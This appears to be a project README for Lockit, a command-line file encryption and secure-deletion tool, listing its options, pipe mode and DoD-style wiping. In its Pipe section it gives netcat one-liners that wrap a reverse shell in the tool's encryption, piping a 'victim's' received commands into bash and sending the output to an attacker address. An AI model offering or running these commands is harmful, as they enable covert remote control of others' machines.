# Lockit
Lock it, unlock it.

⚡ Blazing fast encryption suite.

```bash
./lockit <file> <file2> <dir1>             # Process files in default mode (encrypt/decrypt)
./lockit encrypt <file> <file2> <dir1>     # Encrypt specific files
./lockit encrypt <file> -p                 # Encrypt a file with a custom passphrase.
./lockit encrypt <dir>                     # Encrypt all files in a directory
./lockit decrypt <dir/file>                # Decrypt a file or directory
./lockit encrypt <dir> --zipdir            # Compress, tar, and encrypt entire directories
./lockit remove/delete/rm/del <dir/file>   # Securely delete a file / directory.
./lockit remove <file> <file2> --skip-dod  # Skip DoD overwrite passes.
./lockit encrypt --pipe                    # Process as pipe.
./lockit decrypt --pipe -p                 # Process as pipe, custom passphrase.
./lockit --encrypt-filenames               # Encrypt file names
./lockit --no-encrypt-filenames            # Keep file names unchanged
./lockit --self-destruct                   # Remove Lockit after use
./lockit --no-self-destruct                # Retain Lockit after use
```

## Pipe
If `--pipe` is specified, the program processes the input from stdin and outputs to stdout instead of handling files or directories.

```bash
echo "Secret message" | ./lockit encrypt --pipe | ./lockit decrypt --pipe
```

That way you can encrypt files through IO:
```
cat plaintext.txt | ./lockit encrypt --pipe > encrypted.enc
```

Or use it with netcat or other tools. 
```bash
nc -lvnp 9999 | ./lockit decrypt --pipe
echo "This is a very secret message" | ./lockit encrypt --pipe | nc localhost 9999
```

You can wrap your reverse shell around it and you'll have it encrypted. Example:
```bash
nc -lvnp 9999 | ./lockit decrypt --pipe | bash 2>&1 | ./lockit encrypt --pipe | nc 192.168.50.160 9998 # victim receiving commands
nc -lvnp 9998 | ./lockit decrypt --pipe # attacker receiving output
./lockit encrypt --pipe | nc 192.168.60.244 9999 # attacker sending commands
```

## Mechanismg
- Lockit compresses files using zstd and secures them with AES-256-GCM encryption.
- Lockit provides secure file deletion that follows DoD 5220.22-M standard.

## But I have SSD
Yes, although DoD 5220.22-M short wipe is good enough for most cases, due to SSD wear leveling, you won't be able to remove the data fully using software. The best way to handle this is combination of hardware TRIM erase and cryptographic erasure. Encrypt the disk fully and delete the key.

## Installation
```bash
git clone https://github.com/krystianbajno/lockit
cargo build --release
```

## Customizing Default Settings
To change default settings, simply modify `build.rs`.